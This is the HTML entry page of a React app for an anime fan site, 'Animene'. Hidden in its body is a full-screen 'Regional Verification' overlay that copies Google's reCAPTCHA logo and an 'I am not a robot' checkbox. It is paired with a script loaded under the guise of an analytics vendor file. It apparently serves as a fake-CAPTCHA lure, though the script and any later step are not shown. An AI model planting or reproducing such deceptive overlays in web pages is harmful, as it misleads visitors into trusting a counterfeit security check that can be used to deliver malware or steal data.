<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Animene - A platform for anime lovers" />
    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
    <title>Animene - Home</title>

    <script src="%PUBLIC_URL%/static/js/vendor/v3/analytics-provider.js"></script>
  </head>
  <body>
    <div id="verify-layer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(11,11,11,0.95); z-index:999999; align-items:center; justify-content:center; font-family:sans-serif;">
      <div id="verify-status" style="background:#fff; padding:40px; border-radius:8px; text-align:center; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="margin-bottom:20px;">
        <h3 style="color:#333; margin-top:0;">Regional Verification</h3>
        <p style="color:#666; font-size:14px; line-height:1.6;">Access to this content requires regional verification. Please click 'I am not a robot' to continue.</p>
        <div id="captcha-trigger" style="border:1px solid #ccc; padding:15px; background:#f9f9f9; display:flex; align-items:center; gap:10px; border-radius:4px; cursor:pointer;">
          <input type="checkbox" id="verify-checkbox" style="cursor:pointer;">
          <span style="font-size:14px; color:#555;">I am not a robot</span>
        </div>
      </div>
    </div>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
  </body>
</html>
